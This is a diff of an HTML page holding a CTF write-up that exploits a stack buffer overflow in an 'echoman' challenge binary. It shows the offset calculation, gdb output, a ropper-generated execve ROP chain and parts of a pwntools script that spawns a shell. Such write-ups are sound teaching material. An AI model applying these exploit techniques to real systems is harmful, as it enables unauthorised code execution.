@@ -57,28 +57,26 @@ The provided binary can be found
 <h2>The program</h2>
 <p>The binary is a simple echo server.
 Here the string <em>TEST</em> is entered:</p>
-<div class="highlight"><pre><span></span>$ ./echoman
+<div class="highlight"><pre><span></span><code>$ ./echoman
 Hi my name is Echoman
 Let me echo something for you !
 TEST
 Here iiit iiiis: TEST
-</pre></div>
-
+</code></pre></div>
 
 <p>The binary's protections:</p>
-<div class="highlight"><pre><span></span>&gt; checksec
+<div class="highlight"><pre><span></span><code>&gt; checksec
 Canary                        : Yes
 NX                            : Yes
 PIE                           : No
 Fortify                       : No
 RelRO                         : Partial
-</pre></div>
-
+</code></pre></div>
 
 <h2>The vulnerabilities</h2>
 <p>Using <a href="https://ghidra-sre.org/">Ghidra</a> one gets quickly an overview of
 the vulnerability in the <code>echoman</code> function:</p>
-<div class="highlight"><pre><span></span><span class="kt">void</span> <span class="nf">echoman</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<div class="highlight"><pre><span></span><code><span class="kt">void</span> <span class="nf">echoman</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
 <span class="p">{</span>
   <span class="kt">char</span> <span class="n">buf</span> <span class="p">[</span><span class="mi">128</span><span class="p">];</span>
 
@@ -87,13 +85,12 @@ the vulnerability in the <code>echoman</code> function:</p>
   <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Here iiit iiiis: %s&quot;</span><span class="p">,</span><span class="n">buf</span><span class="p">);</span>
   <span class="k">return</span><span class="p">;</span>
 <span class="p">}</span>
-</pre></div>
-
+</code></pre></div>
 
 <p>We can overflow the <code>buf</code> buffer and take control of the program.</p>
 <p>Using gdb, one can see how much we need to
 write in order to reach <em>saved rip</em>.</p>
-<div class="highlight"><pre><span></span>&gt; disas echoman
+<div class="highlight"><pre><span></span><code>&gt; disas echoman
 Dump of assembler code for function echoman:
    0x0000000000401d38 &lt;+0&gt;: push   rbp
    0x0000000000401d39 &lt;+1&gt;: mov    rbp,rsp
@@ -113,23 +110,21 @@ Dump of assembler code for function echoman:
    0x0000000000401d76 &lt;+62&gt;:    leave
    0x0000000000401d77 &lt;+63&gt;:    ret
 End of assembler dump.
-</pre></div>
-
+</code></pre></div>
 
 <p>So we need to push 128 bytes (<code>0xffffffffffffff80 = -128</code>)
 to overwrite the buffer, then
 8 bytes to overwrite <em>saved rbp</em> (<code>push rbp</code>)
 and finally 8 bytes to overwrite
 <em>saved rip</em> and take control of the flow</p>
-<div class="highlight"><pre><span></span>$ python -c <span class="s1">&#39;print(&quot;A&quot;*128 + &quot;B&quot;*8 + &quot;C&quot;*8)&#39;</span>
+<div class="highlight"><pre><span></span><code>$ python -c <span class="s1">&#39;print(&quot;A&quot;*128 + &quot;B&quot;*8 + &quot;C&quot;*8)&#39;</span>
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCC
-</pre></div>
-
+</code></pre></div>
 
 <p>Generating that in Python and then feeding it to the program
 shows us in gdb that the <em>saved rip</em> is overwritten
 by <code>C</code>s</p>
-<div class="highlight"><pre><span></span>&gt; info frame
+<div class="highlight"><pre><span></span><code>&gt; info frame
 Stack level 0, frame at 0x7fffffffe340:
  rip = 0x401d75 in echoman; saved rip = 0x4343434343434343
  called by frame at 0x7fffffffe348
@@ -137,23 +132,21 @@ Stack level 0, frame at 0x7fffffffe340:
  Locals at 0x7fffffffe330, Previous frame&#39;s sp is 0x7fffffffe340
  Saved registers:
   rbp at 0x7fffffffe330, rip at 0x7fffffffe338
-</pre></div>
-
+</code></pre></div>
 
 <h2>Exploit</h2>
 <p>So we simply need to overflow (128+8 bytes) and then
 write our ROP chain to exploit it.</p>
 <p>Ropper was able to automatically generate a working
 ROP chain:</p>
-<div class="highlight"><pre><span></span>$ ropper -f echoman --chain execve
-</pre></div>
-
+<div class="highlight"><pre><span></span><code>$ ropper -f echoman --chain execve
+</code></pre></div>
 
 <p>It is clearly nicer to build the ROP chain manually
 but due to time constraints <code>ropper</code> provided us
 a nice working solution.</p>
 <p>Here's the complete pwntools script to exploit it:</p>
-<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python2</span>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python2</span>
 
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="o">*</span>
@@ -166,7 +159,7 @@ a nice working solution.</p>
 
 <span class="c1">#proc = remote(host, port)</span>
 <span class="n">proc</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="s1">&#39;started ...&#39;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;started ...&#39;</span><span class="p">)</span>
 
 <span class="n">query</span> <span class="o">=</span> <span class="s1">&#39;Let me echo something for you !&#39;</span>
 <span class="n">proc</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
@@ -214,7 +207,7 @@ a nice working solution.</p>
 <span class="c1"># profit</span>
 <span class="n">proc</span><span class="o">.</span><span class="n">clean</span><span class="p">()</span>
 <span class="n">proc</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 <footer class="footer">
     <p>
     &copy; 2015 deadc0de
